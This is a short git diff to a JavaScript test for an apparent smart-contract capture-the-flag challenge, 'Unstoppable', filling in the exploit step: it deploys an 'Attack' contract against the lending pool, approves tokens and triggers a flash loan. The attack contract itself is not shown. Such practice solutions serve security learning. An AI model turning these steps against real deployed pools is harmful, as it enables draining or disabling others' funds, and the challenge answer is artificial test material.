@@ -40,6 +40,11 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackFactory = await ethers.getContractFactory('Attack', attacker)
+        this.attack = await AttackFactory.deploy(this.pool.address)
+
+        this.token.connect(attacker).approve(this.attack.address, 10)
+        this.attack.executeFlashLoan(TOKENS_IN_POOL)
     });
 
     after(async function () {
